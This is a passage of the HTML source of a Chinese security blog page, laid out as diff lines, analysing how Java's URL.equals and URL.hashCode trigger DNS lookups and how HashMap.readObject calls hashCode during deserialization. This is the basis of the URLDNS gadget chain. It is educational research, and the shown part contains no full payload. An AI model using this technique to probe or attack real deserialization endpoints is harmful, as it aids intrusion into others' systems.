+</a>
+</li>
+</ul>
+</li>
+<li data-nav-id=/zh-cn/misc/tunnel/network-layer/ title=网络层隧道 class=dd-item>
+<a href=/zh-cn/misc/tunnel/network-layer/>
+<b>X. </b>网络层隧道
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li data-nav-id=/zh-cn/others/ title=其他 class=dd-item>
+<a href=/zh-cn/others/>
+<b>X. </b>其他
+<i class="fas fa-check read-icon"></i>
+</a>
+<ul>
+<li data-nav-id=/zh-cn/others/add-timeline-shortcode/ title=给hugo-theme-learn增加timeline功能 class=dd-item>
+<a href=/zh-cn/others/add-timeline-shortcode/>
+给hugo-theme-learn增加timeline功能
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/others/how-to-reset-password-administrator-on-windows-server-2019/ title="在Windows server 2019上重置密码" class=dd-item>
+<a href=/zh-cn/others/how-to-reset-password-administrator-on-windows-server-2019/>
+在Windows server 2019上重置密码
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/others/vmware-based-implementation-of-small-domain-network-construction/ title=基于Vmware的小型域网络搭建 class=dd-item>
+<a href=/zh-cn/others/vmware-based-implementation-of-small-domain-network-construction/>
+基于Vmware的小型域网络搭建
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+</ul>
+</li>
+</ul>
+<section id=shortcuts>
+<h3>更多</h3>
+<ul>
+<li>
+<a class=padding href=https://www.ch35tnut.site/zh-cn/about><i class="fas fa-person-booth"></i> 关于</a>
+</li>
+<li>
+<a class=padding href=https://github.com/Chestnut4/><i class="fab fa-github"></i> Github 链接</a>
+</li>
+<li>
+<a class=padding href=https://www.ch35tnut.site/zh-cn/tags><i class="fas fa-tags"></i> 标签</a>
+</li>
+<li>
+<a class=padding href=https://www.ch35tnut.site/zh-cn/index.xml><i class="fas fa-fw fa-link"></i> RSS</a>
+</li>
+</ul>
+</section>
+<section id=prefooter>
+<hr>
+<ul>
+<li>
+<a class=padding>
+<i class="fas fa-language fa-fw"></i>
+<div class=select-style>
+<select id=select-language onchange="location=this.value"><option id=zh-cn value=https://www.ch35tnut.site/zh-cn/research/web/java-deserialization/urldns/ selected>简体中文</option></select><svg id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="255" height="255" viewBox="0 0 255 255" style="enable-background:new 0 0 255 255"><g><g id="arrow-drop-down"><polygon points="0,63.75 127.5,191.25 255,63.75"/></g></g></svg>
+</div>
+</a>
+</li>
+<li><a class=padding href=# data-clear-history-toggle><i class="fas fa-history fa-fw"></i> 清理历史记录</a></li>
+</ul>
+</section>
+<section id=footer>
+<center>
+</center>
+<script async defer src=https://buttons.github.io/buttons.js></script>
+</section>
+</div>
+</nav>
+<section id=body>
+<div id=overlay></div>
+<div class="padding highlightable">
+<div>
+<div id=top-bar>
+<div id=breadcrumbs itemscope itemtype=http://data-vocabulary.org/Breadcrumb>
+<span id=sidebar-toggle-span>
+<a href=# id=sidebar-toggle data-sidebar-toggle>
+<i class="fas fa-bars"></i>
+</a>
+</span>
+<span id=toc-menu><i class="fas fa-list-alt"></i></span>
+<span class=links>
+<a href=/zh-cn/>首页</a> > <a href=/zh-cn/research/>安全研究</a> > <a href=/zh-cn/research/web/>Web</a> > <a href=/zh-cn/research/web/java-deserialization/>Java Deserialization</a> > JAVA URL DNS 研究
+</span>
+</div>
+<div class=progress>
+<div class=wrapper>
+<nav id=TableOfContents>
+<ul>
+<li>
+<ul>
+<li></li>
+</ul>
+</li>
+</ul>
+</nav>
+</div>
+</div>
+</div>
+</div>
+<div id=head-tags>
+<div class=tags>
+<a class=tag-link href=/zh-cn/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6>安全研究</a>
+<a class=tag-link href=/zh-cn/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96>反序列化</a>
+</div>
+</div>
+<div id=body-inner>
+<h1>
+JAVA URL DNS 研究
+</h1>
+<div class=progress>
+<div class=wrapper>
+</div>
+</div>
+<nav id=TableOfContents>
+<ul>
+<li>
+<ul>
+<li></li>
+</ul>
+</li>
+</ul>
+</nav>
+<p><strong>前言</strong></p>
+<p>初步入门java反序列化学习，做一个学习记录，水一篇文章。如果有问题可以邮件：got_
+<a href=mailto:whipper.0p@icloud.com>whipper.0p@icloud.com</a></p>
+<h4 id=url类dns请求>URL类DNS请求</h4>
+<p>使用URL.equals会发起DNS请求</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>urltest</span> <span style=color:#f92672>{</span>
+    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span><span style=color:#f92672>(</span>String<span style=color:#f92672>[]</span> args<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> MalformedURLException <span style=color:#f92672>{</span>
+        System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;hello &#34;</span><span style=color:#f92672>);</span>
+        URL u <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> URL<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;http://www.baidu.com&#34;</span><span style=color:#f92672>);</span>
+        URL u1 <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> URL<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;http://www.baidu.com&#34;</span><span style=color:#f92672>);</span>
+       System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span>u<span style=color:#f92672>.</span><span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span>u1<span style=color:#f92672>));</span>
+    <span style=color:#f92672>}</span>
+<span style=color:#f92672>}</span>
+</code></pre></div><p>
+<img alt src=/images/research/web/java-deserialization/urldns.zh-cn.assets/2.png></p>
+<p>跟进代码，equals代码如下，</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>    <span style=color:#66d9ef>protected</span> <span style=color:#66d9ef>boolean</span> <span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span>URL u1<span style=color:#f92672>,</span> URL u2<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+        String ref1 <span style=color:#f92672>=</span> u1<span style=color:#f92672>.</span><span style=color:#a6e22e>getRef</span><span style=color:#f92672>();</span>
+        String ref2 <span style=color:#f92672>=</span> u2<span style=color:#f92672>.</span><span style=color:#a6e22e>getRef</span><span style=color:#f92672>();</span>
+        <span style=color:#66d9ef>return</span> <span style=color:#f92672>(</span>ref1 <span style=color:#f92672>==</span> ref2 <span style=color:#f92672>||</span> <span style=color:#f92672>(</span>ref1 <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>&amp;&amp;</span> ref1<span style=color:#f92672>.</span><span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span>ref2<span style=color:#f92672>)))</span> <span style=color:#f92672>&amp;&amp;</span>
+               sameFile<span style=color:#f92672>(</span>u1<span style=color:#f92672>,</span> u2<span style=color:#f92672>);</span>
+    <span style=color:#f92672>}</span>
+</code></pre></div><p>判断reference是否相同，而后使用sameFile函数，sameFile函数会查看其协议、uri、端口、主机是否相等。</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>    <span style=color:#66d9ef>protected</span> <span style=color:#66d9ef>boolean</span> <span style=color:#a6e22e>sameFile</span><span style=color:#f92672>(</span>URL u1<span style=color:#f92672>,</span> URL u2<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+        <span style=color:#75715e>// Compare the protocols.
+</span><span style=color:#75715e></span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(!((</span>u1<span style=color:#f92672>.</span><span style=color:#a6e22e>getProtocol</span><span style=color:#f92672>()</span> <span style=color:#f92672>==</span> u2<span style=color:#f92672>.</span><span style=color:#a6e22e>getProtocol</span><span style=color:#f92672>())</span> <span style=color:#f92672>||</span>
+              <span style=color:#f92672>(</span>u1<span style=color:#f92672>.</span><span style=color:#a6e22e>getProtocol</span><span style=color:#f92672>()</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>&amp;&amp;</span>
+               u1<span style=color:#f92672>.</span><span style=color:#a6e22e>getProtocol</span><span style=color:#f92672>().</span><span style=color:#a6e22e>equalsIgnoreCase</span><span style=color:#f92672>(</span>u2<span style=color:#f92672>.</span><span style=color:#a6e22e>getProtocol</span><span style=color:#f92672>()))))</span>
+            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span><span style=color:#f92672>;</span>
+
+        <span style=color:#75715e>// Compare the files.
+</span><span style=color:#75715e></span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(!(</span>u1<span style=color:#f92672>.</span><span style=color:#a6e22e>getFile</span><span style=color:#f92672>()</span> <span style=color:#f92672>==</span> u2<span style=color:#f92672>.</span><span style=color:#a6e22e>getFile</span><span style=color:#f92672>()</span> <span style=color:#f92672>||</span>
+              <span style=color:#f92672>(</span>u1<span style=color:#f92672>.</span><span style=color:#a6e22e>getFile</span><span style=color:#f92672>()</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>&amp;&amp;</span> u1<span style=color:#f92672>.</span><span style=color:#a6e22e>getFile</span><span style=color:#f92672>().</span><span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span>u2<span style=color:#f92672>.</span><span style=color:#a6e22e>getFile</span><span style=color:#f92672>()))))</span>
+            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span><span style=color:#f92672>;</span>
+
+        <span style=color:#75715e>// Compare the ports.
+</span><span style=color:#75715e></span>        <span style=color:#66d9ef>int</span> port1<span style=color:#f92672>,</span> port2<span style=color:#f92672>;</span>
+        port1 <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>u1<span style=color:#f92672>.</span><span style=color:#a6e22e>getPort</span><span style=color:#f92672>()</span> <span style=color:#f92672>!=</span> <span style=color:#f92672>-</span>1<span style=color:#f92672>)</span> <span style=color:#f92672>?</span> u1<span style=color:#f92672>.</span><span style=color:#a6e22e>getPort</span><span style=color:#f92672>()</span> <span style=color:#f92672>:</span> u1<span style=color:#f92672>.</span><span style=color:#a6e22e>handler</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getDefaultPort</span><span style=color:#f92672>();</span>
+        port2 <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>u2<span style=color:#f92672>.</span><span style=color:#a6e22e>getPort</span><span style=color:#f92672>()</span> <span style=color:#f92672>!=</span> <span style=color:#f92672>-</span>1<span style=color:#f92672>)</span> <span style=color:#f92672>?</span> u2<span style=color:#f92672>.</span><span style=color:#a6e22e>getPort</span><span style=color:#f92672>()</span> <span style=color:#f92672>:</span> u2<span style=color:#f92672>.</span><span style=color:#a6e22e>handler</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getDefaultPort</span><span style=color:#f92672>();</span>
+        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>port1 <span style=color:#f92672>!=</span> port2<span style=color:#f92672>)</span>
+            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span><span style=color:#f92672>;</span>
+
+        <span style=color:#75715e>// Compare the hosts.
+</span><span style=color:#75715e></span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(!</span>hostsEqual<span style=color:#f92672>(</span>u1<span style=color:#f92672>,</span> u2<span style=color:#f92672>))</span>
+            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span><span style=color:#f92672>;</span>
+
+        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span><span style=color:#f92672>;</span>
+    <span style=color:#f92672>}</span>
+</code></pre></div><p>hostsEqual方法中会调用getHostAddress方法，getHostAddress方法会通过InetAddress.getByName函数获取到域名对应的IP地址，触发DNS解析</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>    <span style=color:#66d9ef>protected</span> <span style=color:#66d9ef>boolean</span> <span style=color:#a6e22e>hostsEqual</span><span style=color:#f92672>(</span>URL u1<span style=color:#f92672>,</span> URL u2<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+        InetAddress a1 <span style=color:#f92672>=</span> getHostAddress<span style=color:#f92672>(</span>u1<span style=color:#f92672>);</span>
+        InetAddress a2 <span style=color:#f92672>=</span> getHostAddress<span style=color:#f92672>(</span>u2<span style=color:#f92672>);</span>
+
+    <span style=color:#66d9ef>protected</span> <span style=color:#66d9ef>synchronized</span> InetAddress <span style=color:#a6e22e>getHostAddress</span><span style=color:#f92672>(</span>URL u<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>u<span style=color:#f92672>.</span><span style=color:#a6e22e>hostAddress</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span>
+            <span style=color:#66d9ef>return</span> u<span style=color:#f92672>.</span><span style=color:#a6e22e>hostAddress</span><span style=color:#f92672>;</span>
+
+        String host <span style=color:#f92672>=</span> u<span style=color:#f92672>.</span><span style=color:#a6e22e>getHost</span><span style=color:#f92672>();</span>
+        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>host <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>||</span> host<span style=color:#f92672>.</span><span style=color:#a6e22e>isEmpty</span><span style=color:#f92672>())</span> <span style=color:#f92672>{</span>
+            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
+        <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#f92672>{</span>
+            <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
+                u<span style=color:#f92672>.</span><span style=color:#a6e22e>hostAddress</span> <span style=color:#f92672>=</span> InetAddress<span style=color:#f92672>.</span><span style=color:#a6e22e>getByName</span><span style=color:#f92672>(</span>host<span style=color:#f92672>);</span>
+            <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>UnknownHostException ex<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+                <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
+            <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>SecurityException se<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+                <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
+            <span style=color:#f92672>}</span>
+        <span style=color:#f92672>}</span>
+        <span style=color:#66d9ef>return</span> u<span style=color:#f92672>.</span><span style=color:#a6e22e>hostAddress</span><span style=color:#f92672>;</span>
+    <span style=color:#f92672>}</span>
+</code></pre></div><p>同样的URL类中的hashCode也会触发DNS请求，通过getHostAddress获取到IP地址，需要注意的是其中hashCode会被缓存</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>synchronized</span> <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>hashCode</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
+        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>hashCode <span style=color:#f92672>!=</span> <span style=color:#f92672>-</span>1<span style=color:#f92672>)</span>
+            <span style=color:#66d9ef>return</span> hashCode<span style=color:#f92672>;</span>
+
+        hashCode <span style=color:#f92672>=</span> handler<span style=color:#f92672>.</span><span style=color:#a6e22e>hashCode</span><span style=color:#f92672>(</span><span style=color:#66d9ef>this</span><span style=color:#f92672>);</span>
+        <span style=color:#66d9ef>return</span> hashCode<span style=color:#f92672>;</span>
+    <span style=color:#f92672>}</span>
+
+    <span style=color:#66d9ef>protected</span> <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>hashCode</span><span style=color:#f92672>(</span>URL u<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+        <span style=color:#66d9ef>int</span> h <span style=color:#f92672>=</span> 0<span style=color:#f92672>;</span>
+
+        <span style=color:#75715e>// Generate the protocol part.
+</span><span style=color:#75715e></span>        String protocol <span style=color:#f92672>=</span> u<span style=color:#f92672>.</span><span style=color:#a6e22e>getProtocol</span><span style=color:#f92672>();</span>
+        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>protocol <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span>
+            h <span style=color:#f92672>+=</span> protocol<span style=color:#f92672>.</span><span style=color:#a6e22e>hashCode</span><span style=color:#f92672>();</span>
+
+        <span style=color:#75715e>// Generate the host part.
+</span><span style=color:#75715e></span>        InetAddress addr <span style=color:#f92672>=</span> getHostAddress<span style=color:#f92672>(</span>u<span style=color:#f92672>);</span>
+        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>addr <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+            h <span style=color:#f92672>+=</span> addr<span style=color:#f92672>.</span><span style=color:#a6e22e>hashCode</span><span style=color:#f92672>();</span>
+        <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#f92672>{</span>
+            String host <span style=color:#f92672>=</span> u<span style=color:#f92672>.</span><span style=color:#a6e22e>getHost</span><span style=color:#f92672>();</span>
+            <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>host <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span>
+                h <span style=color:#f92672>+=</span> host<span style=color:#f92672>.</span><span style=color:#a6e22e>toLowerCase</span><span style=color:#f92672>().</span><span style=color:#a6e22e>hashCode</span><span style=color:#f92672>();</span>
+        <span style=color:#f92672>}</span>
+</code></pre></div><p>通过调用URL类的equals和hashCode方法即可触发DNS请求</p>
+<h4 id=hashmap原理>HashMap原理</h4>
+<p><strong>数据结构</strong></p>
+<p>HashMap采用数组+链表方式存储键值对，其中链表为单向链表</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>transient</span> Node<span style=color:#f92672>&lt;</span>K<span style=color:#f92672>,</span>V<span style=color:#f92672>&gt;[]</span> table<span style=color:#f92672>;</span>
+    <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Node</span><span style=color:#f92672>&lt;</span>K<span style=color:#f92672>,</span>V<span style=color:#f92672>&gt;</span> <span style=color:#66d9ef>implements</span> Map<span style=color:#f92672>.</span><span style=color:#a6e22e>Entry</span><span style=color:#f92672>&lt;</span>K<span style=color:#f92672>,</span>V<span style=color:#f92672>&gt;</span> <span style=color:#f92672>{</span>
+        <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>int</span> hash<span style=color:#f92672>;</span>
+        <span style=color:#66d9ef>final</span> K key<span style=color:#f92672>;</span>
+        V value<span style=color:#f92672>;</span>
+        Node<span style=color:#f92672>&lt;</span>K<span style=color:#f92672>,</span>V<span style=color:#f92672>&gt;</span> next<span style=color:#f92672>;</span>
+
+        Node<span style=color:#f92672>(</span><span style=color:#66d9ef>int</span> hash<span style=color:#f92672>,</span> K key<span style=color:#f92672>,</span> V value<span style=color:#f92672>,</span> Node<span style=color:#f92672>&lt;</span>K<span style=color:#f92672>,</span>V<span style=color:#f92672>&gt;</span> next<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+            <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>hash</span> <span style=color:#f92672>=</span> hash<span style=color:#f92672>;</span>
+            <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>key</span> <span style=color:#f92672>=</span> key<span style=color:#f92672>;</span>
+            <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>value</span> <span style=color:#f92672>=</span> value<span style=color:#f92672>;</span>
+            <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>next</span> <span style=color:#f92672>=</span> next<span style=color:#f92672>;</span>
+        <span style=color:#f92672>}</span>
+</code></pre></div><p>默认情况下java中的HashMap大小只有16，当产生hash冲突时，就把它插入到链表中的下一个元素，在取出元素时，首先计算hash，根据hash找到对应的链表，而后遍历链表获取到value。</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>int</span> DEFAULT_INITIAL_CAPACITY <span style=color:#f92672>=</span> 1 <span style=color:#f92672>&lt;&lt;</span> 4<span style=color:#f92672>;</span>
+</code></pre></div><p>可以用如下图
+<img alt src=/images/research/web/java-deserialization/urldns.zh-cn.assets/1.webp></p>
+<p>HashMap重写了readObject方法，反序列化HashMap数据时会调用重写的readObject方法，代码如下</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>readObject</span><span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>io</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ObjectInputStream</span> s<span style=color:#f92672>)</span>
+        <span style=color:#66d9ef>throws</span> IOException<span style=color:#f92672>,</span> ClassNotFoundException <span style=color:#f92672>{</span>
+        <span style=color:#75715e>// Read in the threshold (ignored), loadfactor, and any hidden stuff
+</span><span style=color:#75715e></span>        s<span style=color:#f92672>.</span><span style=color:#a6e22e>defaultReadObject</span><span style=color:#f92672>();</span>
+        reinitialize<span style=color:#f92672>();</span>
+        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>loadFactor <span style=color:#f92672>&lt;=</span> 0 <span style=color:#f92672>||</span> Float<span style=color:#f92672>.</span><span style=color:#a6e22e>isNaN</span><span style=color:#f92672>(</span>loadFactor<span style=color:#f92672>))</span>
+            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> InvalidObjectException<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Illegal load factor: &#34;</span> <span style=color:#f92672>+</span>
+                                             loadFactor<span style=color:#f92672>);</span>
+        s<span style=color:#f92672>.</span><span style=color:#a6e22e>readInt</span><span style=color:#f92672>();</span>                <span style=color:#75715e>// Read and ignore number of buckets
+</span><span style=color:#75715e></span>        <span style=color:#66d9ef>int</span> mappings <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span><span style=color:#a6e22e>readInt</span><span style=color:#f92672>();</span> <span style=color:#75715e>// Read number of mappings (size)
+</span><span style=color:#75715e></span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>mappings <span style=color:#f92672>&lt;</span> 0<span style=color:#f92672>)</span>
+            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> InvalidObjectException<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Illegal mappings count: &#34;</span> <span style=color:#f92672>+</span>
+                                             mappings<span style=color:#f92672>);</span>
+        <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>mappings <span style=color:#f92672>&gt;</span> 0<span style=color:#f92672>)</span> <span style=color:#f92672>{</span> <span style=color:#75715e>// (if zero, use defaults)
+</span><span style=color:#75715e></span>            <span style=color:#75715e>// Size the table using given load factor only if within
+</span><span style=color:#75715e></span>            <span style=color:#75715e>// range of 0.25...4.0
+</span><span style=color:#75715e></span>            <span style=color:#66d9ef>float</span> lf <span style=color:#f92672>=</span> Math<span style=color:#f92672>.</span><span style=color:#a6e22e>min</span><span style=color:#f92672>(</span>Math<span style=color:#f92672>.</span><span style=color:#a6e22e>max</span><span style=color:#f92672>(</span>0<span style=color:#f92672>.</span><span style=color:#a6e22e>25f</span><span style=color:#f92672>,</span> loadFactor<span style=color:#f92672>),</span> 4<span style=color:#f92672>.</span><span style=color:#a6e22e>0f</span><span style=color:#f92672>);</span>
+            <span style=color:#66d9ef>float</span> fc <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#66d9ef>float</span><span style=color:#f92672>)</span>mappings <span style=color:#f92672>/</span> lf <span style=color:#f92672>+</span> 1<span style=color:#f92672>.</span><span style=color:#a6e22e>0f</span><span style=color:#f92672>;</span>
+            <span style=color:#66d9ef>int</span> cap <span style=color:#f92672>=</span> <span style=color:#f92672>((</span>fc <span style=color:#f92672>&lt;</span> DEFAULT_INITIAL_CAPACITY<span style=color:#f92672>)</span> <span style=color:#f92672>?</span>
+                       DEFAULT_INITIAL_CAPACITY <span style=color:#f92672>:</span>
+                       <span style=color:#f92672>(</span>fc <span style=color:#f92672>&gt;=</span> MAXIMUM_CAPACITY<span style=color:#f92672>)</span> <span style=color:#f92672>?</span>
+                       MAXIMUM_CAPACITY <span style=color:#f92672>:</span>
+                       tableSizeFor<span style=color:#f92672>((</span><span style=color:#66d9ef>int</span><span style=color:#f92672>)</span>fc<span style=color:#f92672>));</span>
+            <span style=color:#66d9ef>float</span> ft <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#66d9ef>float</span><span style=color:#f92672>)</span>cap <span style=color:#f92672>*</span> lf<span style=color:#f92672>;</span>
+            threshold <span style=color:#f92672>=</span> <span style=color:#f92672>((</span>cap <span style=color:#f92672>&lt;</span> MAXIMUM_CAPACITY <span style=color:#f92672>&amp;&amp;</span> ft <span style=color:#f92672>&lt;</span> MAXIMUM_CAPACITY<span style=color:#f92672>)</span> <span style=color:#f92672>?</span>
+                         <span style=color:#f92672>(</span><span style=color:#66d9ef>int</span><span style=color:#f92672>)</span>ft <span style=color:#f92672>:</span> Integer<span style=color:#f92672>.</span><span style=color:#a6e22e>MAX_VALUE</span><span style=color:#f92672>);</span>
+
+            <span style=color:#75715e>// Check Map.Entry[].class since it&#39;s the nearest public type to
+</span><span style=color:#75715e></span>            <span style=color:#75715e>// what we&#39;re actually creating.
+</span><span style=color:#75715e></span>            SharedSecrets<span style=color:#f92672>.</span><span style=color:#a6e22e>getJavaObjectInputStreamAccess</span><span style=color:#f92672>().</span><span style=color:#a6e22e>checkArray</span><span style=color:#f92672>(</span>s<span style=color:#f92672>,</span> Map<span style=color:#f92672>.</span><span style=color:#a6e22e>Entry</span><span style=color:#f92672>[].</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> cap<span style=color:#f92672>);</span>
+            <span style=color:#a6e22e>@SuppressWarnings</span><span style=color:#f92672>({</span><span style=color:#e6db74>&#34;rawtypes&#34;</span><span style=color:#f92672>,</span><span style=color:#e6db74>&#34;unchecked&#34;</span><span style=color:#f92672>})</span>
+            Node<span style=color:#f92672>&lt;</span>K<span style=color:#f92672>,</span>V<span style=color:#f92672>&gt;[]</span> tab <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>Node<span style=color:#f92672>&lt;</span>K<span style=color:#f92672>,</span>V<span style=color:#f92672>&gt;[])</span><span style=color:#66d9ef>new</span> Node<span style=color:#f92672>[</span>cap<span style=color:#f92672>];</span>
+            table <span style=color:#f92672>=</span> tab<span style=color:#f92672>;</span>
+
+            <span style=color:#75715e>// Read the keys and values, and put the mappings in the HashMap
+</span><span style=color:#75715e></span>            <span style=color:#66d9ef>for</span> <span style=color:#f92672>(</span><span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> 0<span style=color:#f92672>;</span> i <span style=color:#f92672>&lt;</span> mappings<span style=color:#f92672>;</span> i<span style=color:#f92672>++)</span> <span style=color:#f92672>{</span>
+                <span style=color:#a6e22e>@SuppressWarnings</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;unchecked&#34;</span><span style=color:#f92672>)</span>
+                    K key <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>K<span style=color:#f92672>)</span> s<span style=color:#f92672>.</span><span style=color:#a6e22e>readObject</span><span style=color:#f92672>();</span>
+                <span style=color:#a6e22e>@SuppressWarnings</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;unchecked&#34;</span><span style=color:#f92672>)</span>
+                    V value <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>V<span style=color:#f92672>)</span> s<span style=color:#f92672>.</span><span style=color:#a6e22e>readObject</span><span style=color:#f92672>();</span>
+                putVal<span style=color:#f92672>(</span>hash<span style=color:#f92672>(</span>key<span style=color:#f92672>),</span> key<span style=color:#f92672>,</span> value<span style=color:#f92672>,</span> <span style=color:#66d9ef>false</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>false</span><span style=color:#f92672>);</span>
+            <span style=color:#f92672>}</span>
+        <span style=color:#f92672>}</span>
+    <span style=color:#f92672>}</span>
